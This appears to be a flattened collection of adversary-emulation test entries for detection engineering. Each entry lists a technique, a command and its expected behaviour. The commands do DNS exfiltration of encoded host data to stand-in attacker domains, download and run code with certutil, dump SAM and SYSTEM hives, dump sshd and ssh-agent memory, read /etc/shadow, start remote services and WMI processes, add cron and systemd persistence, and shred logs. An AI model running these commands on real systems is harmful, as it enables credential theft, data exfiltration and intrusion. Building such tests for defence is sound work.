rules.description: Detects potential exfiltration of data over a C2 channel using DNS, as indicated by anomalies in DNS query behavior
falsepositives: Legitimate use of long domain names or base64 encoding in DNS queries for non-malicious purposes
High-volume DNS query traffic from hosts due to legitimate applications or services

attacks.description: Executes a PowerShell one‑liner to list svchost processes, demonstrating basic PowerShell execution.
attacks.expected_behavior: Outputs a list of running svchost processes to the console.

attacks.command: powershell -Command "$scriptPath = \"$env:TEMP\\testscript.ps1\"; Set-Content -Path $scriptPath -Value \"Write-Host 'Hello from PowerShell script'\" -Force; & $scriptPath; Remove-Item -Path $scriptPath -ErrorAction SilentlyContinue"
attacks.description: Creates a temporary PowerShell script in %TEMP%, writes a benign message, runs the script, and deletes it, showing intermediate script execution.
attacks.expected_behavior: Displays 'Hello from PowerShell script' on the console, then removes the temporary script file.

attacks.description: Runs a Base64‑encoded PowerShell command (Get-Date) using -EncodedCommand, illustrating advanced encoded execution.
attacks.expected_behavior: Prints the current system date and time to the console.

attacks.description: Basic command to execute a PowerShell script that writes the current date to a file in the temp directory
attacks.expected_behavior: The command will create a file named date.txt in the temp directory with the current date

attacks.description: Intermediate command to execute a PowerShell script that compresses a file in the temp directory
attacks.expected_behavior: The command will create a zip file named date.zip in the temp directory with the date.txt file compressed inside

attacks.description: Advanced command to execute a PowerShell script that removes files in the temp directory
attacks.expected_behavior: The command will remove the date.txt and date.zip files from the temp directory, and if the files do not exist, it will silently continue without errors

attacks.command: echo 'test_data_exfil' > "%TEMP%\exfil.txt" & certutil.exe -encode "%TEMP%\exfil.txt" "%TEMP%\exfil.b64" & set /p b64_data=<"%TEMP%\exfil.b64" & for /f "tokens=2 delims=:" %i in ('echo %b64_data% ^| findstr /n /c:%b64_data%') do set trimmed=%i & nslookup %trimmed:.=% attacker-dns.com
attacks.description: Basic exfiltration: Encode a small test file to base64, extract encoded string, replace '=' with '.' and send via DNS lookup to attacker domain.
attacks.expected_behavior: Creates a small text file in TEMP, encodes it to base64, reads the encoded string, removes padding, replaces dots, and sends it via DNS query to attacker-dns.com. No actual data theft occurs; uses benign string.

attacks.command: powershell -Command "mkdir '%TEMP%\exfil_stage' -ErrorAction SilentlyContinue; echo 'sensitive_file_sim' > '%TEMP%\exfil_stage\data.txt'; Compress-Archive -Path '%TEMP%\exfil_stage\data.txt' -DestinationPath '%TEMP%\exfil_stage\data.zip' -Force; certutil.exe -encode '%TEMP%\exfil_stage\data.zip' '%TEMP%\exfil_stage\data.b64'; $b64 = Get-Content '%TEMP%\exfil_stage\data.b64'; $chunks = $b64 -split '(.{50})' | Where-Object { $_ -ne '' }; ForEach ($chunk in $chunks) { $domain = $chunk.Trim() -replace '\W', '.'; $null = Resolve-DnsName "$domain.attacker-c2.com" -Type A -ErrorAction SilentlyContinue }"
attacks.description: Intermediate exfiltration: Stage a file, compress, encode to base64, split into chunks, and exfiltrate via multiple DNS A record lookups to attacker-controlled domain.
attacks.expected_behavior: Creates a temporary directory, places a test file, compresses and encodes it, splits into 50-character chunks, converts each to a subdomain, and performs DNS lookups. Simulates staged exfiltration using common Windows tools. Uses Resolve-DnsName which is available on modern Windows systems.

attacks.command: echo 'dummy_log_data_123' > "%TEMP%\logpart.txt" & certutil.exe -hashfile "%TEMP%\logpart.txt" MD5 & set /p file_hash=<"%TEMP%\logpart.txt" & for /f "tokens=*" %i in ('echo %file_hash%') do set hash_str=%i & nslookup "%hash_str:.=%.hash.attacker-dns.com" & ping -n 1 "%hash_str%.data.attacker-dns.com" > nul
attacks.description: Advanced exfiltration using dual channels: Send file hash via DNS lookup and data identifier via ping (which triggers DNS resolution) to different subdomains of attacker domain.
attacks.expected_behavior: Creates a dummy file, computes its hash (simulated content fingerprint), sends the hash as a subdomain via nslookup, then uses ping on a related subdomain to trigger additional DNS traffic. Simulates multi-method DNS exfiltration without transferring full data. Uses only built-in tools: echo, certutil, nslookup, ping.

attacks.command: hostname | tr -d '\n' | xxd -p | sed 's/\(..\)/\\1./g' | sed 's/$/c2attacker.com/' | xargs -I {} dig +short {}
attacks.description: Basic DNS exfiltration: Sends hostname in hexadecimal format as a DNS subdomain query to c2attacker.com using dig.
attacks.expected_behavior: Performs a DNS lookup for a subdomain containing the hex-encoded hostname, e.g., '68:6f:73:74...' becomes '68.6f.73.74...c2attacker.com'. No data is actually received by attacker in test.

attacks.command: DATA=$(base64 /etc/hostname 2>/dev/null | tr -d '=+' | cut -c1-50); for part in $(echo $DATA | grep -o .\{1,63\}); do dig +short "$part.c2attacker.com"; done
attacks.description: Intermediate DNS exfiltration: Reads and base64-encodes a system file, splits into 63-character chunks, and sends each as a DNS query to c2attacker.com.
attacks.expected_behavior: Generates multiple DNS queries with base64 fragments as subdomains. Simulates file exfiltration over DNS in chunks compliant with domain length limits.

attacks.command: TEMP_FILE=$(mktemp); tar -czf $TEMP_FILE -C /etc hostname 2>/dev/null; SPLIT_DATA=$(base64 $TEMP_FILE | tr -d '\n=' | fold -w 63); for SUBDOMAIN in $SPLIT_DATA; do dig +short "$SUBDOMAIN.c2attacker.com" || true; done; rm -f "$TEMP_FILE" 2>/dev/null
attacks.description: Advanced DNS exfiltration: Compresses a file, base64-encodes it, splits into DNS-compatible chunks, sends via dig, and cleans up temporary file.
attacks.expected_behavior: Creates a compressed archive of /etc/hostname, encodes it, and exfiltrates through multiple DNS queries. Temporary file is removed after use. Robust against transient DNS failures.

attacks.technique_name: Masquerading: Match Legitimate Name or Location
attacks.description: Copies a legitimate Windows executable to a temporary directory and renames it to winhttp.dll, a name that matches a legitimate system DLL, demonstrating masquerading by name.
attacks.expected_behavior: A file named winhttp.dll appears in the %TEMP% folder containing the binary data of notepad.exe.

attacks.technique_name: Masquerading: Match Legitimate Name or Location
attacks.command: powershell -Command "New-Item -Path \"$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe\" -ItemType File -Force; Set-Content -Path \"$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe\" -Value 'Placeholder content for masquerading test' -Encoding ASCII"
attacks.description: Creates a file named svchost.exe in the user's Startup folder, matching the name of a legitimate system process, to test detection of masqueraded executables in a common autostart location.
attacks.expected_behavior: The file svchost.exe is created in the Startup directory with the provided placeholder text; it would be executed on user logon if it were a real executable.

attacks.technique_name: Masquerading: Match Legitimate Name or Location
attacks.description: Writes a base64‑encoded benign string to a temporary file and decodes it to a DLL named cryptsp.dll in the System32 directory, mimicking a legitimate cryptographic DLL name.
attacks.expected_behavior: A file cryptsp.dll is created in %SystemRoot%\System32 containing the decoded string "Hello"; the file name matches a legitimate Windows DLL.

attacks.technique_name: Masquerading: Match Legitimate Name or Location
attacks.description: Copies the legitimate 'ls' command to a temporary location, overwrites it with a malicious payload, and makes it executable.
attacks.expected_behavior: The command will create a file named 'ls' in the /tmp directory, which could potentially be executed by an unsuspecting user, thus demonstrating masquerading.

attacks.technique_name: Masquerading: Match Legitimate Name or Location
attacks.description: Creates a script named 'update.sh' in the /tmp directory, which could be mistaken for a legitimate update script, and makes it executable.
attacks.expected_behavior: The command creates a potentially malicious script that masquerades as an update script, which could be executed by an administrator or a scheduled task.

attacks.command: powershell -Command "$User='test'; $Pass=ConvertTo-SecureString 'Password' -AsPlainText -Force; $Cred=New-Object System.Management.Automation.PSCredential($User,$Pass); $Session=New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri http://exchange-server/PowerShell/ -Authentication Kerberos -Credential $Cred; Import-PSSession $Session -DisableNameChecking; Get-Mailbox -ResultSize 5 | Select-Object PrimarySmtpAddress"
attacks.description: Open a remote Exchange PowerShell session and list the PrimarySmtpAddress of up to five mailboxes.
attacks.expected_behavior: Displays up to five SMTP addresses on the console if the credentials are valid and the Exchange server is reachable.

attacks.description: Search the current user's Outlook profile directory for PST files and output their full paths.
attacks.expected_behavior: Lists the file system paths of any PST files found in the user's Outlook data folder.

attacks.command: powershell -Command "$tempFile = Join-Path $env:TEMP 'mailbox_export.txt'; $Session = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri http://exchange-server/PowerShell/ -Authentication Kerberos; Import-PSSession $Session -DisableNameChecking; Get-Mailbox -ResultSize Unlimited | Select-Object PrimarySmtpAddress | Out-File -FilePath $tempFile -Encoding ASCII; Write-Output ('Exported mailbox addresses to ' + $tempFile)"
attacks.description: Create a remote Exchange session, enumerate all mailbox SMTP addresses, and write them to a temporary text file.
attacks.expected_behavior: Generates a file named mailbox_export.txt in the %TEMP% directory containing one SMTP address per line, and prints the file path.

attacks.description: Basic EWS API authentication attempt using NTLM
attacks.expected_behavior: Attempts NTLM authentication to Exchange Web Services (EWS) endpoint to access mailbox data

attacks.description: Intermediate IMAP email collection via fetchmail
attacks.expected_behavior: Downloads emails from Exchange server via IMAP using SSL connection and stores locally

attacks.command: (echo 'A1 LOGIN testuser TestPass123'; echo 'A2 SELECT INBOX'; echo 'A3 FETCH 1:* BODY.PEEK[]'; sleep 2) | openssl s_client -connect imap.exchange.example.com:993 -ign_eof > /tmp/emails.txt
attacks.description: Advanced raw IMAP collection via OpenSSL
attacks.expected_behavior: Manually interacts with IMAP over SSL to fetch and save entire mailbox contents to /tmp/emails.txt

attacks.description: Lists all stored credentials for the current user, simulating the initial step in credential dumping.
attacks.expected_behavior: Displays a list of stored credentials.

attacks.description: Uses PowerShell to locate system files that could be involved in credential dumping, simulating an intermediate step in identifying potential targets for credential extraction.
attacks.expected_behavior: Lists the SAM, SECURITY, and SYSTEM files if accessible.

attacks.description: Saves the SYSTEM hive to a temporary location, which could be a step in preparing for credential dumping. This command requires admin privileges and simulates an advanced action in credential dumping scenarios.
attacks.expected_behavior: Saves the SYSTEM registry hive to a file named system.hive in the temp directory.

attacks.description: Basic credential search in kernel memory using strings
attacks.expected_behavior: Scans kernel memory for password/credential strings. May return false positives from unstructured data.

attacks.description: Intermediate credential dumping with mimipenguin tool
attacks.expected_behavior: Executes mimipenguin to extract credentials from memory processes like sshd or GNOME keyring.

attacks.command: sudo gdb -p $(pidof sshd) -batch -ex 'dump memory /tmp/ssh_mem 0x00007f0000000000 0x00007f0000100000' && strings /tmp/ssh_mem | grep -i passw
attacks.description: Advanced memory dumping of sshd process with GDB
attacks.expected_behavior: Dumps specified memory region of SSH daemon and searches for password strings. May crash service if misconfigured.

attacks.description: Basic PowerShell command that enumerates running processes with CPU usage greater than zero.
attacks.expected_behavior: Outputs a list of processes to the console where the CPU time is greater than zero.

attacks.description: Intermediate PowerShell command that decodes a Base64 string and writes the result to a file in the TEMP directory.
attacks.expected_behavior: Creates a file named hello.txt in the user's TEMP folder containing the text "Hello world".

attacks.description: Advanced PowerShell command that uses the legacy schtasks.exe binary to create a one‑time scheduled task which writes a test file.
attacks.expected_behavior: Creates a scheduled task named TestTask that runs once at midnight, executing a command that writes the string "Test" to test.txt in the TEMP directory.

attacks.description: Basic PowerShell execution on Linux using pwsh to output a test string
attacks.expected_behavior: Outputs 'Test execution via PowerShell Core' to stdout and exits cleanly

attacks.command: pwsh -Command "mkdir '$env:TEMP/test_ps' -ErrorAction SilentlyContinue; Set-Content -Path '$env:TEMP/test_ps/log.txt' -Value 'PowerShell activity log' -Force; Get-Content '$env:TEMP/test_ps/log.txt'"
attacks.description: Intermediate command creating a directory and file in temp, writing a benign log, then reading it back using PowerShell Core
attacks.expected_behavior: Creates a test directory and log file in $TEMP, writes a string, reads it back, and outputs the content to stdout

attacks.command: pwsh -Command "try { $webRequest = Invoke-WebRequest -Uri 'http://127.0.0.1:8080/test' -Method GET -ErrorAction Stop; Set-Content -Path '$env:TEMP/pwsh_cache.bin' -Value $webRequest.Content -Force } catch { Write-Warning 'No server running locally, simulating fallback' }; Compress-Archive -Path '$env:TEMP/pwsh_cache.bin' -DestinationPath '$env:TEMP/payload.zip' -Force -ErrorAction SilentlyContinue; Remove-Item '$env:TEMP/pwsh_cache.bin' -Force -ErrorAction SilentlyContinue"
attacks.description: Advanced command simulating data exfiltration: attempts to fetch data from a local endpoint, caches it, compresses it, and cleans up
attacks.expected_behavior: Attempts to make a web request (will fail unless local server running), writes response to file if successful, compresses the file into a zip, then deletes the original. Fails silently on cleanup. Safe for isolated environments.

attacks.command: sc.exe \\TARGET_HOST create AgentRacoon binPath= "cmd.exe /c calc.exe" start= auto
attacks.description: Creates a remote service on TARGET_HOST to execute calc.exe
attacks.expected_behavior: Creates a service named AgentRacoon on the remote host, which starts calc.exe when the service is started.

attacks.description: Creates a scheduled task on TARGET_HOST to run calc.exe at system startup
attacks.expected_behavior: Creates a scheduled task named AgentRacoonTask on the remote host, triggering calc.exe execution on system start.

attacks.description: Executes calc.exe on TARGET_HOST using WMI
attacks.expected_behavior: Starts calc.exe on the remote host via WMI process creation.

attacks.description: Basic remote access using SSH
attacks.expected_behavior: Establishes a secure shell connection to a remote host.

attacks.description: Intermediate: Setting up a netcat listener for reverse shell
attacks.expected_behavior: Listens on port 1234 and executes /bin/bash when a connection is established, providing a reverse shell.

attacks.description: Advanced: Reverse SSH tunnel for remote access
attacks.expected_behavior: Creates a reverse SSH tunnel from the local machine to the remote host, allowing the remote host to connect back to the local machine.

attacks.description: Attempt to read a hardcoded credential file path that mimics malware looking for plaintext credentials in a common system directory
attacks.expected_behavior: Outputs the content of creds.txt if it exists in PROGRAMDATA, otherwise fails silently. Simulates credential file access using a built-in CMD command.

attacks.description: Copy SSH configuration file from user's AppData to temp directory, simulating collection of credential-related configuration data
attacks.expected_behavior: Copies the SSH config file if present to the temp directory with overwrite enabled. Uses built-in copy command for maximum compatibility and detection fidelity.

attacks.command: powershell -Command "mkdir '$env:TEMP\\_credstore' -ErrorAction SilentlyContinue; Get-ChildItem -Path '$env:TEMP\\_credstore' -Filter '*.dat' -ErrorAction SilentlyContinue | ForEach-Object { Compress-Archive -Path $_.FullName -DestinationPath '$env:TEMP\\collected_creds.zip' -Update -Force }"
attacks.description: Create a temporary credential store directory, then search and compress any .dat files within it to simulate packaging stolen credentials
attacks.expected_behavior: Creates a temp directory, looks for .dat files, and appends them to a ZIP archive if found. Uses PowerShell only where needed (archive creation), with proper error handling and escaping.

attacks.description: Reads the shadow password file which contains hashed credentials for local users
attacks.expected_behavior: Outputs hashed password entries for local system users if executed with root privileges; otherwise, returns a permission denied error

attacks.description: Searches common configuration directories in user home folders for files containing 'password' in content, limited to specific safe extensions
attacks.expected_behavior: Finds and displays lines containing 'password' in configuration files under user .config directories; skips inaccessible paths silently

attacks.description: Locates and reads potential credential or auth-related files in /opt, a common directory for third-party software configurations
attacks.expected_behavior: Outputs content of files matching naming patterns like 'credentials.*' or 'auth.*' in /opt if they exist and are readable

attacks.description: Uses the Windows command interpreter (cmd.exe) to write a test string to a temporary file.
attacks.expected_behavior: Creates %TEMP%\basic.txt containing the text 'Basic test'.

attacks.description: Executes the built‑in net.exe utility via cmd.exe to enumerate local user accounts.
attacks.expected_behavior: Displays a list of local user accounts in the console output.

attacks.description: PowerShell launches cmd.exe as a child process to run whoami and write the result to a temporary file.
attacks.expected_behavior: Creates %TEMP%\whoami.txt containing the current user name; no console window is shown.

attacks.description: Basic enumeration of local user accounts using the legacy net.exe binary.
attacks.expected_behavior: Displays a list of local user accounts on the system.

attacks.description: Intermediate enumeration of domain user accounts (if joined to a domain) using net.exe.
attacks.expected_behavior: Shows domain user accounts; on a workgroup machine it will return an error, which is harmless.

attacks.command: powershell -Command "reg save HKLM\SAM $env:TEMP\sam.save; reg save HKLM\System $env:TEMP\system.save; Compress-Archive -Path $env:TEMP\sam.save,$env:TEMP\system.save -DestinationPath $env:TEMP\hashes.zip -Force; Remove-Item $env:TEMP\sam.save,$env:TEMP\system.save -ErrorAction SilentlyContinue"
attacks.description: Advanced credential dump: saves the SAM and SYSTEM registry hives to temporary files, compresses them into a zip archive, and cleans up the raw dumps.
attacks.expected_behavior: Creates %TEMP%\sam.save and %TEMP%\system.save containing raw registry hives, then packages them into %TEMP%\hashes.zip. The raw files are removed afterward.

attacks.description: Attempt to read the shadow password file to extract hashed credentials.
attacks.expected_behavior: If executed as root, outputs hashed passwords for all users. If not root, returns permission denied. This simulates credential dumping using valid elevated account access.

attacks.description: Check sudo permissions and attempt to read /etc/shadow using sudo, simulating abuse of valid account with sudo privileges.
attacks.expected_behavior: Lists allowed sudo commands, then attempts to read /etc/shadow. Succeeds if user has sudo rights to cat or all commands. Demonstrates lateral movement and credential access via valid account with elevated rights.

attacks.command: gdb -p $(pgrep -n ssh-agent) -batch -ex 'dump memory /tmp/ssh_mem.dump 0x$(cat /proc/$(pgrep -n ssh-agent)/maps | grep "stack" | tail -1 | awk "{print \"0x\"\$1}" | cut -d'-' -f1) 0x$(cat /proc/$(pgrep -n ssh-agent)/maps | grep "stack" | tail -1 | awk "{print \"0x\"\$1}" | cut -d'-' -f2)') -ex 'quit'
attacks.description: Use gdb to attach to the SSH agent process and dump its memory to a file, potentially extracting private keys or tokens.
attacks.expected_behavior: Attaches to the SSH agent process, dumps stack memory to /tmp/ssh_mem.dump. May contain sensitive data if SSH keys are loaded. Simulates advanced credential dumping using a valid user account and native debugging tools.

attacks.description: Basic use of cleanmgr.exe to perform automatic cleanup on C: drive
attacks.expected_behavior: cleanmgr.exe runs in automated mode, deleting temporary and system cache files on C: drive without user interaction

attacks.description: Intermediate: Use PowerShell to silently launch cleanmgr.exe with predefined settings (sagerun:1)
attacks.expected_behavior: cleanmgr.exe runs in the background using saved settings (sagerun:1), deleting temporary files; window is hidden

attacks.description: Advanced: Execute cleanmgr.exe with encoded command to delete files in a specific temp directory, simulating obfuscation
attacks.expected_behavior: PowerShell decodes and runs a command that attempts to delete files in $env:TEMP\test_del_tmp using cleanmgr.exe; error if path doesn't exist, but continues silently

attacks.description: Basic file deletion using rm to remove a temporary log file
attacks.expected_behavior: Deletes the file /tmp/debug.log if it exists; no error output if file is missing due to -f flag

attacks.description: Intermediate file deletion using find to locate and remove all .tmp files in the user's home directory
attacks.expected_behavior: Finds all files ending in .tmp within the user's home directory and deletes them immediately

attacks.description: Advanced secure file deletion using shred to overwrite and remove a sensitive log file
attacks.expected_behavior: Overwrites /var/log/auth.log 3 times with random data, then zeros it, and unlinks it to prevent recovery

attacks.description: Basic DNS beacon using the built‑in nslookup utility to query a malicious domain.
attacks.expected_behavior: A DNS A‑record lookup is sent to the resolver for test123.example.com; the attacker can observe the query in their DNS logs.

attacks.description: Intermediate beacon that generates a unique sub‑domain with a timestamp and resolves it via PowerShell's Resolve-DnsName cmdlet.
attacks.expected_behavior: PowerShell constructs a domain like session_20251229143055.example.com and performs a DNS lookup, creating a distinct beacon each execution.

attacks.description: Advanced exfiltration: encodes a short string to hex and sends it via a DNS TXT query using nslookup.
attacks.expected_behavior: The string 'secret' is converted to its hexadecimal representation (736563726574) and queried as a TXT record (736563726574.exfil.example.com). The attacker can retrieve the data from the DNS query logs.

attacks.description: Basic DNS lookup to simulate C2 beaconing using Google's public DNS
attacks.expected_behavior: Sends a DNS A record query for beacon.testc2.example.com to 8.8.8.8. Expected to return NXDOMAIN or no answer if domain doesn't exist. Simulates periodic C2 beaconing.

attacks.description: Intermediate DNS query attempting to retrieve TXT records that may contain encoded data
attacks.expected_behavior: Queries TXT records for data=exfil.testc2.example.com and filters output. Simulates retrieval of encoded commands or configuration from DNS, commonly seen in DNS tunneling tools.

attacks.description: Advanced DNS query with encoded subdomain and custom DNS server to simulate data encoding in DNS tunneling
attacks.expected_behavior: Performs MX record lookup on a transformed subdomain using Quad9 DNS. Demonstrates how attackers encode session data in subdomains and use alternative DNS servers to avoid detection.

attacks.technique_name: Archive Collected Data: Archive via Utility
attacks.description: Basic archiving using PowerShell's Compress-Archive cmdlet
attacks.expected_behavior: Creates an archive of the specified file

attacks.technique_name: Archive Collected Data: Archive via Utility
attacks.description: Intermediate archiving using the zip utility
attacks.expected_behavior: Creates an archive of the specified file using the zip utility

attacks.technique_name: Archive Collected Data: Archive via Utility
attacks.description: Advanced archiving using the System.IO.Compression.FileSystem assembly
attacks.expected_behavior: Creates an archive of the specified directory using the System.IO.Compression.FileSystem assembly

attacks.technique_name: Archive Collected Data: Archive via Utility
attacks.description: Archives a single collected data file using 7-Zip with default settings.
attacks.expected_behavior: Creates an archive named 'collected_data.7z' containing the file '/tmp/sensitive_dump.txt' if it exists; otherwise, reports an error.

attacks.technique_name: Archive Collected Data: Archive via Utility
attacks.description: Finds all .log files in the user's home directory and compresses them into a tar.gz archive.
attacks.expected_behavior: Creates 'logs_archive.tar.gz' containing all matched .log files; if no files match, the archive may be created empty or not at all depending on tar behavior.

attacks.technique_name: Archive Collected Data: Archive via Utility
attacks.command: zip -r exfil_payload.zip /var/log/apache2/ -i '*.log' || echo 'No logs found to archive'
attacks.description: Recursively archives Apache log files into a ZIP archive, with fallback message on failure.
attacks.expected_behavior: Creates 'exfil_payload.zip' containing all .log files from /var/log/apache2/ if accessible; requires root privileges for access to /var/log/apache2/; prints fallback message if no files found or access denied.

attacks.command: schtasks /create /tn "Test Task" /tr "cmd /c echo Hello World > %TEMP%\test.txt" /sc daily
attacks.description: Create a new daily task named 'Test Task' that writes 'Hello World' to a file in the temp directory
attacks.expected_behavior: A new task is created and runs daily, writing to a file in the temp directory

attacks.description: Create a new task named 'Intermediate Task' that runs every 30 minutes and writes the current date to a file in the temp directory
attacks.expected_behavior: A new task is created and runs every 30 minutes, writing the current date to a file in the temp directory

attacks.description: Create a new task named 'Advanced Task' that runs hourly and writes a list of files in the temp directory to a file
attacks.expected_behavior: A new task is created and runs hourly, writing a list of files in the temp directory to a file

attacks.description: Add a daily cron job to the current user's crontab
attacks.expected_behavior: Creates a user-level cron job that touches /tmp/user_persist daily

attacks.description: Create a system-wide cron job as root
attacks.expected_behavior: Creates a system cron job in /etc/cron.d that touches /tmp/system_persist daily as root

attacks.command:
sudo bash -c 'echo -e "[Unit]
Description=Red Team Service

[Service]
Type=oneshot
ExecStart=/usr/bin/touch /tmp/systemd_persist

[Install]
WantedBy=multi-user.target" > /etc/systemd/system/redteam.service && echo -e "[Unit]
Description=Red Team Timer

[Timer]
OnCalendar=daily
Persistent=true

[Install]
WantedBy=timers.target" > /etc/systemd/system/redteam.timer && systemctl enable redteam.timer && systemctl start redteam.timer'
attacks.description: Create and activate a systemd timer/service for persistence
attacks.expected_behavior: Creates a systemd service and timer that touches /tmp/systemd_persist daily, with timer activation

attacks.description: Download file over HTTP using certutil
attacks.expected_behavior: Downloads test.txt from example.com via HTTP to TEMP directory using certutil's built-in HTTP client

attacks.description: Send HTTP POST request with PowerShell
attacks.expected_behavior: Sends HTTP POST request to example.com with test payload in request body using PowerShell

attacks.description: DNS query simulating C2 beaconing
attacks.expected_behavior: Performs DNS lookup for test123.example.com, simulating DNS-based command and control activity

attacks.description: Listen on port 8080 and execute /bin/bash when a connection is established, demonstrating a basic reverse shell.
attacks.expected_behavior: Opens a listening port and executes a shell upon connection, which could be used for command and control.

attacks.description: Establish a connection to example.com on port 80, simulating HTTP traffic without actually sending HTTP requests.
attacks.expected_behavior: Establishes a network connection to the specified host and port, which can be used to simulate application layer protocol activity.

attacks.description: Send an HTTP GET request to example.com, demonstrating the use of the application layer protocol for command and control.
attacks.expected_behavior: Sends an HTTP request to the specified server, which is a common application layer protocol used for command and control.

attacks.description: Basic file obfuscation using certutil encoding
attacks.expected_behavior: Creates Base64-encoded version of test file in TEMP directory and deletes original

attacks.description: Intermediate PowerShell encoded command writing benign text
attacks.expected_behavior: Executes Base64-encoded command to create output.txt in TEMP with test content

attacks.command: powershell -Command "$xorKey = 0x55; $payload = [Text.Encoding]::UTF8.GetBytes("Write-Output 'Safe'").ForEach({ $_ -bxor $xorKey }); Set-Content -Path $env:TEMP\obfuscated.bin -Value $payload -Encoding Byte -Force; $decoded = Get-Content $env:TEMP\obfuscated.bin -Encoding Byte | ForEach { $_ -bxor $xorKey }; Invoke-Expression ([Text.Encoding]::UTF8.GetString($decoded))"
attacks.description: Advanced XOR payload obfuscation and in-memory execution
attacks.expected_behavior: Creates XOR-obfuscated binary file and executes decoded payload in memory without disk writes

attacks.description: This command creates a file with obfuscated content using base64 encoding.
attacks.expected_behavior: A file named test.txt will be created in the /tmp directory with the decoded string 'Hello world!'

attacks.description: This command encrypts a system file using AES-256-CBC encryption.
attacks.expected_behavior: A file named encrypted.txt will be created in the /tmp directory with the encrypted contents of /etc/passwd

attacks.description: This command obfuscates a binary file by converting it to a hexadecimal string and removing newlines.
attacks.expected_behavior: A file named obfuscated_ls.txt will be created in the /tmp directory with the obfuscated contents of /bin/ls

attacks.command: cmd.exe /c echo echo Test payload executed > %TEMP%\update.bat && call %TEMP%\update.bat
attacks.description: Basic user execution via batch script creation and execution using cmd.exe
attacks.expected_behavior: Creates a benign batch script in the user's temp directory that prints a message, then executes it using cmd.exe. No elevated privileges required.

attacks.command: cmd.exe /c echo @echo off > %TEMP%\launcher.bat & echo certutil.exe -urlcache -f http://example.com/malicious.exe %TEMP%\malware.exe >> %TEMP%\launcher.bat & echo call %TEMP%\malware.exe >> %TEMP%\launcher.bat & call %TEMP%\launcher.bat
attacks.description: Intermediate user execution using batch script to download and execute a file using certutil
attacks.expected_behavior: Creates a batch script that attempts to download a file using certutil.exe (simulated with a benign URL) and execute it. The URL is non-functional, so no actual download occurs. Execution stays within user context.

attacks.command: powershell -Command "mkdir '%TEMP%\_tmp' -ErrorAction SilentlyContinue; $cmd = 'echo Simulated payload > "%TEMP%\_tmp\log.txt"'; Set-Content -Path '%TEMP%\_tmp\run.bat' -Value $cmd -Force; Start-Process '%TEMP%\_tmp\run.bat' -WindowStyle Hidden"
attacks.description: Advanced user execution using PowerShell to create and run a hidden batch script
attacks.expected_behavior: Uses PowerShell to create a hidden directory in temp, write a benign batch script, and execute it silently. The window is hidden to simulate stealthy execution. No actual malicious payload is used.

attacks.description: Basic local script creation and execution
attacks.expected_behavior: Creates /tmp/script.sh, makes it executable, and runs it to write test output to /tmp/test.log

attacks.description: Intermediate remote script download and execution
attacks.expected_behavior: Downloads a benign script from example.com, executes it to create /tmp/remote_test.log

attacks.description: Advanced base64-encoded command execution
attacks.expected_behavior: Decodes and executes base64-encoded command to write 'Advanced test' to /tmp/advanced_test

attacks.description: Basic WMI query to list running processes using legacy wmic.exe binary
attacks.expected_behavior: Outputs a list of running process names and their IDs to stdout

attacks.description: Intermediate WMI query using PowerShell to retrieve command line arguments of svchost.exe processes
attacks.expected_behavior: Displays ProcessId and CommandLine for all svchost.exe processes; may show empty CommandLine fields

attacks.command: powershell -Command "$cmd = 'echo WMI test > %TEMP%\\wmi_test.txt'; $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd)); Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList @($cmd) -ErrorAction SilentlyContinue"
attacks.description: Advanced WMI execution via Invoke-WmiMethod to create a new process that writes a test file
attacks.expected_behavior: Creates a file wmi_test.txt in the user's TEMP directory with content 'WMI test'; uses WMI to spawn the process

attacks.description: Basic WMI command to create a remote process on the Windows target that runs a harmless echo command.
attacks.expected_behavior: The remote Windows host spawns a cmd.exe process that outputs 'TestRun' to its console. No persistent changes are made.

attacks.command: wmic -U "admin%Password123!" //192.168.10.5 "service where name='WinRM' call change startmode='Automatic'"
attacks.description: Intermediate WMI command that modifies the startup mode of the WinRM service on the remote Windows machine.
attacks.expected_behavior: The WinRM service on the target is set to start automatically. The command returns a success code if the change is permitted.

attacks.description: Advanced WMI query retrieving operating system details from the remote Windows host.
attacks.expected_behavior: The command returns the OS name, version, and serial number of the target system in plain text.

attacks.description: Basic compression of test document to ZIP archive
attacks.expected_behavior: Creates collection.zip in TEMP containing specified test file

attacks.description: Intermediate CAB archive creation using makecab
attacks.expected_behavior: Generates archive.cab in TEMP containing two test documents

attacks.description: Advanced file collection with robocopy followed by compression
attacks.expected_behavior: Copies text files to TEMP\Collected then compresses into ZIP archive

attacks.description: Basic archiving of a single collected file using tar with gzip compression.
attacks.expected_behavior: Creates a gzip-compressed tar archive named archive_basic.tar.gz in the user's home directory containing the file collected_data.txt.

attacks.description: Intermediate archiving of multiple directories using zip with recursion.
attacks.expected_behavior: Creates a zip archive named archive_intermediate.zip in the user's home directory containing the contents of the documents and pictures directories.

attacks.description: Advanced archiving of system configuration directories, excluding log files; requires root privileges.
attacks.expected_behavior: Creates a gzip-compressed tar archive at /tmp/archive_advanced.tar.gz containing the /etc and /var/www directories while omitting any files under /var/log.

attacks.description: Create a user‑level scheduled task that runs at logon and writes a simple text file to the user's temp directory.
attacks.expected_behavior: The task 'TestTask' is registered; on the next user logon it executes and creates %TEMP%\task_output.txt containing the string 'Hello'.

attacks.command: powershell -NoProfile -Command "Set-Content -Path $env:TEMP\\collect.ps1 -Value 'Get-Process | Out-File $env:TEMP\\proc.txt' -Force; schtasks /Create /SC DAILY /ST 00:01 /TN \"ProcCollect\" /TR \"powershell.exe -ExecutionPolicy Bypass -File `\"$env:TEMP\\collect.ps1`\"\" /RL LIMITED"
attacks.description: Generate a PowerShell script that collects process information and register it as a daily scheduled task.
attacks.expected_behavior: A script %TEMP%\collect.ps1 is created; a task 'ProcCollect' is registered to run daily at 00:01, executing the script which writes process list to %TEMP%\proc.txt.

attacks.description: Create a system‑level scheduled task that runs at system start and writes a marker file to the system Temp folder.
attacks.expected_behavior: The task 'SystemTask' is registered under the SYSTEM account; on next boot it runs and creates %SYSTEMROOT%\Temp\sys.txt containing the string 'SystemStart'.

attacks.description: List all cron jobs for the current user
attacks.expected_behavior: Displays a list of scheduled cron jobs

attacks.description: Add a new cron job that runs every minute, printing 'Hello' to the console
attacks.expected_behavior: Adds a new cron job and displays the updated list of cron jobs

attacks.description: Delete all cron jobs for the current user
attacks.expected_behavior: Deletes all cron jobs for the current user

